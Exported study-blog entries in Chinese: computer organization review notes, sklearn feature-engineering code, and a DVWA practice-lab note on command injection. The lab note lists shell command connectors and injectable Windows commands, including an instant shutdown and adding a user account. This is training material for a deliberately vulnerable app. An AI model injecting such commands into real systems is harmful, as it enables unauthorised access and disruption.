<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622104229468.png" alt="image-20230622104229468"></p>
<p>单精度浮点数：1 8 23，以127为偏移</p>
<p>双精度浮点数：1 11 52， 以1023为偏移</p>
<h3 id="2-5-字符编码"><a href="#2-5-字符编码" class="headerlink" title="2.5 字符编码"></a>2.5 字符编码</h3><h3 id="2-6-检错与纠正"><a href="#2-6-检错与纠正" class="headerlink" title="2.6 检错与纠正"></a>2.6 检错与纠正</h3><p>CRC</p>
<p>最小汉明距离</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622105636257.png" alt="image-20230622105636257"></p>
<h1 id="第三章-布尔代数"><a href="#第三章-布尔代数" class="headerlink" title="第三章 布尔代数"></a>第三章 布尔代数</h1><h1 id="第四章-计算机模型MARIE"><a href="#第四章-计算机模型MARIE" class="headerlink" title="第四章 计算机模型MARIE"></a>第四章 计算机模型MARIE</h1><h3 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h3><h3 id="4-2-CPU基础"><a href="#4-2-CPU基础" class="headerlink" title="4.2 CPU基础"></a>4.2 CPU基础</h3><p>CPU:取指，译码，执行</p>
<ul>
<li>数据通路<ul>
<li>ALU：程序执行过程中用于执行逻辑运算和算术运算</li>
<li>寄存器：D触发器构成，一位一个；随时被CPU访问；control unit控制</li>
</ul>
</li>
<li>控制单元：从存储器中读取指令，译码指令，用寄存器中的程序计算器寻找下一条要执行的指令</li>
</ul>
<h3 id="4-3-总线"><a href="#4-3-总线" class="headerlink" title="4.3 总线"></a>4.3 总线</h3><p>点对点总线（P2P）和多点总线</p>
<p>数据总线、地址总线和控制总线</p>
<p>总线仲裁</p>
<ul>
<li>菊花链仲裁（Daisy chain）:按优先级</li>
<li>集中式并行（centralized parallel）：一个中央仲裁控制器仲裁</li>
<li>自选择的分配式（self-selective）：设备自己决定谁使用</li>
<li>冲突检测的分配式（collision-detection）：发生冲突时设备重发请求（以太网）</li>
</ul>
<h3 id="4-4-时钟"><a href="#4-4-时钟" class="headerlink" title="4.4 时钟"></a>4.4 时钟</h3><p>控制指令的执行速度的内部时钟</p>
<h3 id="4-5-I-x2F-O子系统"><a href="#4-5-I-x2F-O子系统" class="headerlink" title="4.5 I&#x2F;O子系统"></a>4.5 I&#x2F;O子系统</h3><ul>
<li>存储器映射I&#x2F;O：对于CPU来说，访问I&#x2F;O和内存没有区别，占用内存空间</li>
<li>基于指令的I&#x2F;O：访问I&#x2F;O有特定的I&#x2F;O指令，不占用内存空间</li>
</ul>
<h3 id="4-6-存储器构成"><a href="#4-6-存储器构成" class="headerlink" title="4.6 存储器构成"></a>4.6 存储器构成</h3><p>内存能够以字节寻址，也能够以字寻址</p>
<p>交叉储存器</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622141050113.png" alt="image-20230622141050113"></p>
<ul>
<li>低位交叉寻址</li>
</ul>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622141126001.png" alt="image-20230622141126001"></p>
<ul>
<li>高位交叉寻址</li>
</ul>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622141147276.png" alt="image-20230622141147276"></p>
<h3 id="4-7-MARIE模型"><a href="#4-7-MARIE模型" class="headerlink" title="4.7 MARIE模型"></a>4.7 MARIE模型</h3><p>MARIE的特点</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622142201856.png" alt="image-20230622142201856"></p>
<p>7个寄存器</p>
<ul>
<li>AC：通用寄存器，保存数据值</li>
<li>MAR：地址</li>
<li>MBR：数据</li>
<li>PC：下一条指令的地址</li>
<li>IR：下一条指令</li>
<li>InREG</li>
<li>OutREG</li>
</ul>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622142922945.png" alt="image-20230622142922945"></p>
<p>ISA的指令集架构</p>
<ul>
<li>MARIE有9个基本指令和6个扩展指令</li>
<li>ISA是计算机硬件和软件中的接口</li>
</ul>
<h3 id="4-8-指令的执行"><a href="#4-8-指令的执行" class="headerlink" title="4.8 指令的执行"></a>4.8 指令的执行</h3><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/1687417136947.jpg.jpg" alt="1687417136947.jpg" style="zoom:50%;">

<h3 id="4-9-中断"><a href="#4-9-中断" class="headerlink" title="4.9 中断"></a>4.9 中断</h3><p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622150746496.png" alt="image-20230622150746496"></p>
<h3 id="4-10-一个简单的程序"><a href="#4-10-一个简单的程序" class="headerlink" title="4.10 一个简单的程序"></a>4.10 一个简单的程序</h3><h3 id="4-11-关于编译程序的讨论"><a href="#4-11-关于编译程序的讨论" class="headerlink" title="4.11 关于编译程序的讨论"></a>4.11 关于编译程序的讨论</h3><p>汇编程序&#x2F;汇编器</p>
]]></content>
      <categories>
        <category>计组复习</category>
      </categories>
      <tags>
        <tag>计组</tag>
        <tag>计算机组件</tag>
        <tag>复习</tag>
        <tag>计算机模型marie</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/11/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>title: 机器学习<br>date: ‎2023‎-10‎-‎12‎ 15:32:38<br>tags: [机器学习]<br>categories: [机器学习]</p>
<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><h2 id="1-1-发展"><a href="#1-1-发展" class="headerlink" title="1.1 发展"></a>1.1 发展</h2><ul>
<li><p>人工智能起点：1956年，达特茅斯会议。</p>
</li>
<li><p>机器学习：1980年代</p>
</li>
<li><p>深度学习：2010年代</p>
</li>
</ul>
<h2 id="1-2-应用场景"><a href="#1-2-应用场景" class="headerlink" title="1.2 应用场景"></a>1.2 应用场景</h2><p>预测，图像，NLP等</p>
<span id="more"></span>



<h2 id="1-3-机器学习"><a href="#1-3-机器学习" class="headerlink" title="1.3 机器学习"></a>1.3 机器学习</h2><p>使用数学工具在数据集学习规律，应用规律解决新问题。</p>
<p>数据集 &#x3D; 特征值 + 目标值（标签）</p>
<p>分类：</p>
<ul>
<li>监督学习（有标签）<ul>
<li>目标值为类别，离散，分类，k-近邻，贝叶斯决策树和随机森林，逻辑回归</li>
<li>目标值连续，回归，线性回归，岭回归</li>
</ul>
</li>
<li>无监督学习&#x2F;零样本学习（无标签）<ul>
<li>聚类，k-means</li>
</ul>
</li>
<li>强化学习（奖励和惩罚）</li>
</ul>
<h2 id="1-4-开发流程"><a href="#1-4-开发流程" class="headerlink" title="1.4 开发流程"></a>1.4 开发流程</h2><ol>
<li>数据获取，拿到数据集</li>
<li>数据处理</li>
<li>构建特征，特征工程</li>
<li>模型训练</li>
<li>模型评估</li>
</ol>
<h1 id="2-数据处理"><a href="#2-数据处理" class="headerlink" title="2. 数据处理"></a>2. 数据处理</h1><h2 id="2-1-开源数据集"><a href="#2-1-开源数据集" class="headerlink" title="2.1 开源数据集"></a>2.1 开源数据集</h2><ul>
<li>sklearn</li>
<li>kaggle</li>
<li>UCI</li>
</ul>
<h2 id="2-2-sklearn数据集"><a href="#2-2-sklearn数据集" class="headerlink" title="2.2 sklearn数据集"></a>2.2 sklearn数据集</h2><h3 id="2-2-1-sklearn数据集获取"><a href="#2-2-1-sklearn数据集获取" class="headerlink" title="2.2.1 sklearn数据集获取"></a>2.2.1 sklearn数据集获取</h3><ul>
<li>sklearn.datasets<ul>
<li>从该数据集中获取到我们需要的具体的数据集</li>
<li>datasets.load_*()<ul>
<li>获取小规模的数据集</li>
</ul>
</li>
<li>datasets.fetch_*(data_home&#x3D;None)<ul>
<li>获取大规模的数据集，一般即时从网络上下载，data_home表示数据集下载的目录，默认参数为~&#x2F;scikit_learn_data</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-2-小数据集获取"><a href="#2-2-2-小数据集获取" class="headerlink" title="2.2.2 小数据集获取"></a>2.2.2 小数据集获取</h3><ul>
<li>sklearn.datasets.load_iris()，鸢尾花数据集</li>
<li>sklearn.datasets.load_boston()，波士顿房价</li>
</ul>
<h3 id="2-2-3-大数据集获取"><a href="#2-2-3-大数据集获取" class="headerlink" title="2.2.3 大数据集获取"></a>2.2.3 大数据集获取</h3><ul>
<li>sklearn.datasets.fetch_20newsgroups(data_home&#x3D;None, subset&#x3D;’all’)<ul>
<li>subset，可为train, test, all，表示加载训练集，测试集或全部</li>
</ul>
</li>
</ul>
<h3 id="2-2-4-数据集返回值"><a href="#2-2-4-数据集返回值" class="headerlink" title="2.2.4 数据集返回值"></a>2.2.4 数据集返回值</h3><p>load和fetch均返回的是datasets.base.Bunch（字典）</p>
<ul>
<li>data：数据特征数组，二维数组</li>
<li>target：标签数组</li>
<li>DESCR：数据描述</li>
<li>feature_names：特征名，回归数据集是没有的</li>
<li>target_names：标签名</li>
</ul>
<p>访问：dict[key]&#x3D;value or dict.ket&#x3D;value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据集获取</span></span><br><span class="line">    iris = load_iris()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;鸢尾花数据集：\n&quot;</span>, iris)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;描述&quot;</span>, iris[<span class="string">&quot;DESCR&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(iris.data)</span><br><span class="line">    <span class="built_in">print</span>(iris.feature_names)</span><br><span class="line">    <span class="built_in">print</span>(iris.target_names)</span><br><span class="line">    <span class="built_in">print</span>(iris.target)</span><br></pre></td></tr></table></figure>

<h3 id="2-2-5-数据集划分"><a href="#2-2-5-数据集划分" class="headerlink" title="2.2.5 数据集划分"></a>2.2.5 数据集划分</h3><p>数据集一般化为训练数据集和测试数据集，一般训练集会更大以获取更好的训练效果</p>
<p><strong>数据集划分的api</strong></p>
<ul>
<li><p>sklearn.model_selection.train_test_split(arrays, *options)</p>
<ul>
<li>x数据集的特征值</li>
<li>y数据集的标签值</li>
<li>test_size 测试集的大小，一般为float，20%传0.2</li>
<li>random_state随机数种子，不同种子采样的结果不同，相同的种子采样结果相同</li>
<li>return 训练集特征值（x_train），测试集特征值（x_test），训练集目标值（y_trian），测试集目标值（y_test）</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分数据集</span></span><br><span class="line">    x_train, x_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=<span class="number">0.2</span>, random_state=<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(x_train, x_train.shape)</span><br><span class="line">    <span class="built_in">print</span>(y_train, y_train.shape)</span><br></pre></td></tr></table></figure>



<h2 id="2-3-特征工程"><a href="#2-3-特征工程" class="headerlink" title="2.3 特征工程"></a>2.3 特征工程</h2><h3 id="2-3-1-介绍"><a href="#2-3-1-介绍" class="headerlink" title="2.3.1 介绍"></a>2.3.1 介绍</h3><ul>
<li>pandas 用于清洗数据，基本处理</li>
<li>sklearn 提供了强大的接口处理特征</li>
</ul>
<h3 id="2-3-2-特征提取"><a href="#2-3-2-特征提取" class="headerlink" title="2.3.2 特征提取"></a>2.3.2 特征提取</h3><p>将数据转化为数字特征，方便计算机更好的理解数据</p>
<ul>
<li>字典特征提取（特征离散化）</li>
<li>文本特征提取</li>
<li>图像特征提取（深度学习）</li>
</ul>
<p><strong>API：sklearn.feature_extraction</strong></p>
<h4 id="1-字典特征提取"><a href="#1-字典特征提取" class="headerlink" title="1. 字典特征提取"></a>1. 字典特征提取</h4><p>对字典数据进行特征值化</p>
<p><strong>对字典中属于类别的数据转化为one-hot编码</strong></p>
<ul>
<li>sklearn.feature_extraction.DictVectorizer(sparse&#x3D;True,…)<ul>
<li>DictVectorizer.fit_transform(x) x为字典类型，返回sparse矩阵（稀疏矩阵）</li>
<li>DictVectorizer.inverse_transform(x) 上述方法的逆方法，x为数组或sparse矩阵，返回字典类型</li>
<li>DictVectorizer.get_feature_names() 返回类别的名称</li>
</ul>
</li>
</ul>
<p>默认返回的是稀疏矩阵，可以通过sparse &#x3D; False取消</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction <span class="keyword">import</span> DictVectorizer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dict_demo</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    字典特征提取</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    data = [&#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;beijing&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>: <span class="number">20</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;shanghai&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>: <span class="number">23</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;shenzhen&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>: <span class="number">28</span>&#125;,</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化转换器类</span></span><br><span class="line">    transfer = DictVectorizer(sparse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    data_new = transfer.fit_transform(data)</span><br><span class="line">    <span class="built_in">print</span>(data_new)</span><br><span class="line">    <span class="built_in">print</span>(transfer.get_feature_names_out(data))</span><br></pre></td></tr></table></figure>

<h4 id="2-文本特征提取"><a href="#2-文本特征提取" class="headerlink" title="2. 文本特征提取"></a>2. 文本特征提取</h4><h5 id="方法1：CountVectorizer"><a href="#方法1：CountVectorizer" class="headerlink" title="方法1：CountVectorizer"></a>方法1：CountVectorizer</h5><p><strong>对文本数据进行特征化</strong></p>
<p>一般将单词、短语等作为特征基本单位</p>
<ul>
<li>sklearn.feature_extraction.text.CountVectorizer(stop_words&#x3D;[])：stop_words选取停用词，这些停用词删除，默认英文的停用词（i,the,a,an这些无意义的词），返回词频矩阵</li>
<li>CountVectorizer.fit_transform(x)：以文本l列表为输入，返回sparse矩阵</li>
<li>CountVectorizer.inverse_transform(x)：上述方法的逆方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> CountVectorizer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_demo</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    文本特征抽取</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data = [<span class="string">&quot;&#x27;build&#x27; not found, did you mean&quot;</span>]</span><br><span class="line"></span><br><span class="line">    transfer = CountVectorizer()</span><br><span class="line"></span><br><span class="line">    data_new = transfer.fit_transform(data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data_new.toarray())</span><br><span class="line">    <span class="built_in">print</span>(transfer.get_feature_names_out())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">[[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]]</span><br><span class="line">[<span class="string">&#x27;build&#x27;</span> <span class="string">&#x27;did&#x27;</span> <span class="string">&#x27;found&#x27;</span> <span class="string">&#x27;mean&#x27;</span> <span class="string">&#x27;not&#x27;</span> <span class="string">&#x27;you&#x27;</span>]</span><br></pre></td></tr></table></figure>



<p><strong>中文文本特征提取</strong></p>
<p>需要用到结巴分词</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> CountVectorizer</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_words</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;注意有一个空格&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(<span class="built_in">list</span>(jieba.cut(text)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_Chinese_demo</span>():</span><br><span class="line">    data = [<span class="string">&quot;画面曝光！乌媒：俄军坦克加装笼形格栅装甲，需更多手段才能摧毁&quot;</span>, <span class="string">&quot;没有必要嘲笑这种防护结构&quot;</span>, <span class="string">&quot;报道称，社交媒体上出现的这段视频中出现了5辆T-62坦克与1辆BTS-4 装甲抢救车 ，其中BTS-4装甲抢救车与一辆T-62坦克被笼状格栅装甲所覆盖，这种格栅装甲是为防御聚能破甲弹药而设计，对坦克形成了全方位保护&quot;</span>]</span><br><span class="line">    cut_data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> data:</span><br><span class="line">        cut_data.append(cut_words(text))</span><br><span class="line">    <span class="comment"># print(cut_data)</span></span><br><span class="line"></span><br><span class="line">    transfer = CountVectorizer()</span><br><span class="line">    data_new = transfer.fit_transform(cut_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data_new.toarray())</span><br><span class="line">    <span class="built_in">print</span>(transfer.get_feature_names_out())</span><br></pre></td></tr></table></figure>

<h5 id="方法2：TfidfVectorizer"><a href="#方法2：TfidfVectorizer" class="headerlink" title="方法2：TfidfVectorizer"></a>方法2：TfidfVectorizer</h5><p>关键词：某句话中能够表征该句话特征的关键词</p>
<p>TF-IDF主要思想：某个词或短语在一篇文章中出现概率高，而在其他的文章中出现的概率低，则该词具有很好的类别区分能力，适合用来分类。可以用来评估一个词在一篇文章或者语料库中的重要程度。</p>
<ul>
<li>TF（term frequency）：词频</li>
<li>IDF（inverse document frequency）：逆向文档频率，度量一个词语的普遍重要性，IDF&#x3D;lg(总文章数&#x2F;包含该词的文章数)。</li>
<li>TF-IDF&#x3D;TF*IDF</li>
</ul>
<p>API：</p>
<ul>
<li>sklearn.feature_extraction.text.TfidfVectorizer(stop_word&#x3D;[], …)：返回词的权重矩阵<ul>
<li>TfidfVectorizer.fit_transform(x)：x为文本，返回sparse矩阵</li>
<li>TfidfVectorizer.inverse_transform(x)：上述的逆方法</li>
<li>TfidfVectorizer.get_feature_names()：返回标签列表</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> TfidfVectorizer</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_words</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;注意有一个空格&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(<span class="built_in">list</span>(jieba.cut(text)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_Chinese_demo</span>():</span><br><span class="line">    data = [<span class="string">&quot;画面曝光！乌媒：俄军坦克加装笼形格栅装甲，需更多手段才能摧毁&quot;</span>, <span class="string">&quot;没有必要嘲笑这种防护结构&quot;</span>, <span class="string">&quot;报道称，社交媒体上出现的这段视频中出现了5辆T-62坦克与1辆BTS-4 装甲抢救车 ，其中BTS-4装甲抢救车与一辆T-62坦克被笼状格栅装甲所覆盖，这种格栅装甲是为防御聚能破甲弹药而设计，对坦克形成了全方位保护&quot;</span>]</span><br><span class="line">    cut_data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> data:</span><br><span class="line">        cut_data.append(cut_words(text))</span><br><span class="line">    <span class="comment"># print(cut_data)</span></span><br><span class="line"></span><br><span class="line">    transfer = TfidfVectorizer()</span><br><span class="line">    data_new = transfer.fit_transform(cut_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data_new.toarray())</span><br><span class="line">    <span class="built_in">print</span>(transfer.get_feature_names_out())</span><br></pre></td></tr></table></figure>



<h2 id="2-4-特征预处理"><a href="#2-4-特征预处理" class="headerlink" title="2.4 特征预处理"></a>2.4 特征预处理</h2><p>通过合适的转化函数<strong>将特征数据转化为更适合算法模型的数据</strong></p>
<p>两种无量纲化（消除量纲的影响）：</p>
<ul>
<li>归一化</li>
<li>标准化</li>
</ul>
<h3 id="2-4-1-归一化"><a href="#2-4-1-归一化" class="headerlink" title="2.4.1 归一化"></a>2.4.1 归一化</h3><p>将原始数据映射到（0,1）的范围内</p>
<p>公式：x1 &#x3D; (x - min) &#x2F; (max - min)， x2 &#x3D; x1 *（mx - mn）+ mn，mx和mi为指定区间的值，默认mx&#x3D;1,mi&#x3D;0</p>
<p>API：</p>
<ul>
<li>sklearn.preprocessing.MinMaxScaler(feature_range&#x3D;(0,1), …)<ul>
<li>MinMaxScaler.fit_transform(x)：x为numpy array格式的数据[n_samples, n_features]，返回同样格式的归一化后的数据</li>
</ul>
</li>
</ul>
<h3 id="2-4-2-标准化"><a href="#2-4-2-标准化" class="headerlink" title="2.4.2 标准化"></a>2.4.2 标准化</h3><p>归一化的最大最小值选取容易受到异常值的影响，因此鲁棒性较差，适用于小数据场景</p>
<p>标准化：将原始数据变换到均值为0，标准差为1的范围内，(x - mean) &#x2F; std</p>
<p>API：</p>
<ul>
<li>sklearn.preprocessing.StandardScaler()：处理后的数据均值为0，标准差为1<ul>
<li>StandardScaler.fit_transform(x)：x为numpy array类型数据，返回标准化后的同样形状的数据</li>
</ul>
</li>
</ul>
<h2 id="2-5-特征降维"><a href="#2-5-特征降维" class="headerlink" title="2.5 特征降维"></a>2.5 特征降维</h2><p>降低特征向量维数，即降低特征个数，得到一组互相”不相关“的主变量的过程</p>
<ul>
<li>特征选择</li>
<li>主成分分析</li>
</ul>
<h3 id="2-5-1-特征选择"><a href="#2-5-1-特征选择" class="headerlink" title="2.5.1 特征选择"></a>2.5.1 特征选择</h3><p>在包含冗余特征的数据中找出主要特征</p>
<p><strong>方法</strong></p>
<ul>
<li>Filter：过滤式<ul>
<li>方差选择法：过滤低方差特征（特征间差距小）</li>
<li>相关系数：过滤相关系数大的特征（特征间相关性强）</li>
</ul>
</li>
<li>Embedded：嵌入式<ul>
<li>决策树</li>
<li>正则化</li>
<li>深度学习</li>
</ul>
</li>
</ul>
<p><strong>API</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.feature_selection</span><br></pre></td></tr></table></figure>

<h4 id="1-过滤式"><a href="#1-过滤式" class="headerlink" title="1. 过滤式"></a>1. 过滤式</h4><ul>
<li>删除低方差特征：将方差较低的那一列特征删除<ul>
<li>sklearn.feature_selection.VarianceThreshold(threshold &#x3D; 0.0)：threshold默认为0.0，即将方差为0的特征删除，可以自己设定<ul>
<li>Variance.fit_transform(x)：x为特征矩阵，返回删除低方差特征后的特征矩阵</li>
</ul>
</li>
</ul>
</li>
<li>皮尔逊相关系数：反应变量间相关关系的密切程度，相关系数的范围一般为-1到1，r&gt;0，正相关，r&lt;0，负相关，绝对值越接近1，相关性越大。<ul>
<li>特征间相关性极高：选取其中一个；加权求和；主成分分析</li>
</ul>
</li>
</ul>
<h3 id="2-5-2-主成分分析（PCA）"><a href="#2-5-2-主成分分析（PCA）" class="headerlink" title="2.5.2 主成分分析（PCA）"></a>2.5.2 主成分分析（PCA）</h3><p>对数据维数进行压缩，尽可能在信息损失比较少的情况下降低维度。</p>
<p>API</p>
<ul>
<li>sklearn.decomposition.PCA(n_components&#x3D;None)：将数据分解到较低维数<ul>
<li>n_components：<ul>
<li>小数：表示保留百分之多少的信息</li>
<li>整数：表示减少到多少特征</li>
</ul>
</li>
<li>PCA.fit_transform(x)：X为特征矩阵，返回指定维数的特征矩阵</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.decomposition <span class="keyword">import</span> PCA</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PCA_demo</span>():</span><br><span class="line">    data = [[<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">    transfer = PCA(n_components=<span class="number">0.95</span>)</span><br><span class="line"></span><br><span class="line">    data_new = transfer.fit_transform(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data_new:\n&quot;</span>, data_new)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>title: DVWA命令执行<br>date: ‎2023-7‎-‎11‎ 22:22:23<br>tags: [命令执行]<br>categories: [rce]</p>
<h3 id="1-常见的网站漏洞"><a href="#1-常见的网站漏洞" class="headerlink" title="1. 常见的网站漏洞"></a>1. 常见的网站漏洞</h3><p>OWASP TOP 10：每年公布关于web安全的十大安全威胁报告，三年公开一次</p>
<ul>
<li>SQL注入（key）：渗透数据库，获取数据库数据或者控制权限</li>
<li>XSS</li>
<li>文件上传（key）：上传木马病毒到网站中</li>
<li>反序列化</li>
<li>文件包含</li>
<li>CSRF</li>
<li>命令执行（key）：获取命令执行的权限</li>
<li>信息泄露</li>
<li>XXE</li>
<li>SSRF</li>
<li>未授权访问</li>
</ul>
<span id="more"></span>



<h3 id="2-DVWA靶场"><a href="#2-DVWA靶场" class="headerlink" title="2. DVWA靶场"></a>2. DVWA靶场</h3><p>OWASP的官方网站</p>
<h4 id="1-DVMA搭建"><a href="#1-DVMA搭建" class="headerlink" title="1. DVMA搭建"></a>1. DVMA搭建</h4><ul>
<li>PHP环境：WASP(Windows, Apache, Mysql, Php)</li>
<li>DVWA源码:<a href="https://codeload.github.com/digininja/DVWA/zip/refs/heads/master">https://codeload.github.com/digininja/DVWA/zip/refs/heads/master</a></li>
</ul>
<h5 id="1-六步快速搭建（使用phpstudy-2018）"><a href="#1-六步快速搭建（使用phpstudy-2018）" class="headerlink" title="1. 六步快速搭建（使用phpstudy 2018）"></a>1. 六步快速搭建（使用phpstudy 2018）</h5><ul>
<li><p>下载安装PHPstudy</p>
</li>
<li><p>将解压后的DVWA源码放在phpstudy安装目录的PHPTutorial\WWW目录下</p>
</li>
<li><p>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</p>
</li>
<li><p>打开刚刚修改的config.inc.php，修改db_user和db_password全为root</p>
</li>
<li><p>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</p>
</li>
<li><p>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</p>
</li>
</ul>
<h5 id="2-使用小皮面板"><a href="#2-使用小皮面板" class="headerlink" title="2. 使用小皮面板"></a>2. 使用小皮面板</h5><ul>
<li>下载安装小皮面板</li>
<li>将下载解压后的DVWA源码放在www目录下</li>
<li>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</li>
<li>打开刚刚修改的config.inc.php，修改db_user和db_password全为root（小皮面板使用的是内置的另一个MySql，如果之前电脑中已经安装MySql，记得改DVWA下config.inc.php中默认的MySql端口号，小皮面板中的配置也记得改）</li>
<li>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</li>
<li>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</li>
</ul>
<h3 id="3-DVWA命令执行漏洞"><a href="#3-DVWA命令执行漏洞" class="headerlink" title="3. DVWA命令执行漏洞"></a>3. DVWA命令执行漏洞</h3><p>攻击者在执行远程的控制命令时，由于系统设置的不完善，导致攻击者可以执行一些特殊的命令，从而取得权限</p>
<h4 id="1-常用连接符"><a href="#1-常用连接符" class="headerlink" title="1. 常用连接符"></a>1. 常用连接符</h4><ul>
<li><p>cmd1|cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
</li>
<li><p>cmd1;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
</li>
<li><p>cmd1&amp;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
</li>
<li><p>cmd1||cmd2，只有cmd1失败时才执行cmd2</p>
</li>
<li><p>cmd1&amp;&amp;cmd2，只有cmd1成功时才执行cmd2</p>
</li>
</ul>
<h4 id="2-常见cmd命令"><a href="#2-常见cmd命令" class="headerlink" title="2. 常见cmd命令"></a>2. 常见cmd命令</h4><ul>
<li>whoami：当前用户名</li>
<li>shutdown -s -t 0：立即关机</li>
<li>net user [username] [password] &#x2F;add 添加用户，用户名为username，密码为password</li>
<li>type [file_name] 查看file_name文件的内容</li>
</ul>
<h4 id="3-Command-injection"><a href="#3-Command-injection" class="headerlink" title="3. Command injection"></a>3. Command injection</h4><p>攻击之前首先将防御级别改低</p>
<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214441876.png" alt="image-20230711214441876"></p>
<p>输入whoami类似的</p>
<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214557276.png" alt="image-20230711214557276"></p>
